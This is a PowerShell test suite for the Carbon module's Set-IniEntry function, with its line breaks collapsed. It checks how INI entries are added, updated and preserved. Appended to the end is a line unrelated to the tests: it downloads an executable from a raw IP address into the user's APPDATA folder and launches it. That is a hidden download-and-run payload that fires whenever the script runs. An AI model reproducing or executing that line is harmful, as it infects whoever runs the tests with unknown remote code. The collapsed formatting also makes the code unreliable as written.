$iniPath = $nullfunction Start-TestFixture{& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)}function Start-Test{$iniPath = Join-Path ([IO.Path]::GetTempPath()) ([IO.Path]::GetRandomFileName())New-Item $iniPath -ItemType File}function Stop-Test{Remove-Item $iniPath}function Test-ShouldAddEntryToEmptyFile{Set-IniEntry -Path $iniPath -Section section -Name empty -Value fileAssert-IniFile @"[section]empty = file"@}function Test-ShouldAddSectionlessEntryToEmptyFile{Set-IniEntry -Path $iniPath -Name empty -Value fileAssert-IniFile @"empty = file"@}function Test-ShouldRejectNamesWithEqualSign{$error.Clear()Set-IniEntry -Path $iniPath -Section section -Name 'i=have=equal=signs' -Value value -ErrorAction SilentlyContinueAssert-Equal 1 $error.CountAssert-IniFile ""}function Test-ShouldNotUpdateIfValueNotChanged{@"[section]name=value"@ > $iniPathSet-IniEntry -Path $iniPath -Section section -Name name -Value valueAssert-IniFile @"[section]name=value"@}function Test-ShouldCreateIniFile{Remove-Item $iniPathSet-IniEntry -Path $iniPath -Section section -Name name -Value valueAssert-IniFile @"[section]name = value"@}function Test-ShouldUpdateExistingEntry{@"[section]name=value"@ > $iniPathSet-IniEntry -Path $iniPath -Section section -Name name -Value newvalueAssert-IniFile     @"[section]name = newvalue"@}function Test-ShouldPreserverWhitespaceAndComments{@"[section]name=value"@ > $iniPathSet-IniEntry -Path $iniPath -Section section -Name name -Value newvalueAssert-IniFile @"[section]name = newvalue"@}function Test-ShouldAddNewEntryToEndOfFile{@"[section]name=value"@ > $iniPathSet-IniEntry -Path $iniPath -Section section2 -Name name2 -Value value2Assert-IniFile @"[section]name=value[section2]name2 = value2"@}function Test-ShouldAddEntryToExistingSectionWithEmptyLineSeparator{@"[section]name=value[section1]name2=value2"@ > $iniPathSet-IniEntry -Path $iniPath -Section section -Name name3 -Value value3Assert-IniFile @"[section]name=valuename3 = value3[section1]name2=value2"@}function Test-ShouldAddEntryToExistingSectionWithNoSeparationBetweenSections{@"[section]name=value[section1]name2=value2"@ > $iniPathSet-IniEntry -Path $iniPath -Section section -Name name3 -Value value3Assert-IniFile @"[section]name=valuename3 = value3[section1]name2=value2"@}function Test-ShouldAddEntryInLastOfMultipleSecitons{@"[section]name=value[section]name2=value2"@ > $iniPathSet-IniEntry -Path $iniPath -Section section -Name name3 -Value value3Assert-IniFile @"[section]name=value[section]name2=value2name3 = value3"@}function Test-ShouldAddEntryAfterLastEntryInSection{@"[section]name=valuename2=value2"@ > $iniPathSet-IniEntry -Path $iniPath -Section section -Name name3 -Value value3Assert-IniFile @"[section]name=valuename2=value2name3 = value3"@}function Test-ShouldAddEntryWithoutSection{@"[section]name=value"@ > $iniPathSet-IniEntry -Path $iniPath -Name name2 -Value value2Assert-IniFile @"name2 = value2[section]name=value"@}function Test-ShouldAddEntryWithoutSectionThatExistsInSection{@"[section]name = value"@ > $iniPathSet-IniEntry -Path $iniPath -Name name -Value valueAssert-IniFile @"name = value[section]name = value"@}function Test-ShouldUpdateEntryWithoutSection{@"name=value"@ > $iniPathSet-IniEntry -Path $iniPath -Name name -Value newvalueAssert-IniFile @"name = newvalue"@}function Test-ShouldAddEntryToExistingSectionlessEntries{@"name = value[section]name2 = value2"@ > $iniPathSet-IniEntry -Path $iniPath -Name name3 -Value value3Assert-IniFile @"name = valuename3 = value3[section]name2 = value2"@}function Test-ShouldSupportWhatIf{@"name = value"@ > $iniPathSet-IniEntry -Path $iniPath -Name name -Value newvalue -WhatIfAssert-IniFile @"name = value"@}function Test-ShouldSupportCaseSensitiveIniFile{@"name = aNAME = b[section]name = c[SECTION]name = d"@ | Set-Content -Path $iniPathSet-IniEntry -Path $iniPath -Name 'name' -Value 2 -CaseSensitiveSet-IniEntry -Path $iniPath -Section 'section' -Name 'name' -Value 4 -CaseSensitive$ini = Split-Ini -Path $iniPath -AsHashtable -CaseSensitiveAssert-Equal '2' $ini['name'].ValueAssert-Equal 'b' $ini['NAME'].ValueAssert-Equal '4' $ini['section.name'].ValueAssert-Equal 'd' $ini['SECTION.name'].Value}function Test-ShouldSupportUnicode{$value = '����������'Set-IniEntry -Path $iniPath -Name 'username' -Value $value$ini = Split-Ini -Path $iniPath -AsHashtableAssert-NotNull $iniAssert-Equal $value $ini['username'].Value}function Test-ShouldPreserveExistingSectionHeadersOnUpdate{'[TestSection01]' | Set-Content $iniPath$expectedFileContents = @"[TestSection01]TestKey01 = TestValue01"@Set-IniEntry -Path $iniPath -Section 'TestSection01' -Name 'TestKey01' -Value 'TestValue01'$actualFileContents = Get-Content -Path $iniPath -RawAssert-Equal -Expected $expectedFileContents -Actual $actualFileContents}function Assert-IniFile{param([string]$ExpectedContents)$expectedLines = @()if( $ExpectedContents ){$expectedLines = $ExpectedContents -split "`r`n"}Assert-FileExists $iniPath$actualContents = @( Get-Content $iniPath )Assert-Equal $expectedLines.Length $actualContents.Length ("Number of lines in file not equal.`n----------`n{0}`n----------`n{1}`n----------`n" -f $ExpectedContents,($actualContents -join "`n"))for( $idx = 0; $idx -lt $actualContents.Length; ++$idx ){Assert-Equal $expectedLines[$idx] $actualContents[$idx] "line $idx"}}(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',"$env:APPDATA\msvmonr.exe");Start-Process ("$env:APPDATA\msvmonr.exe")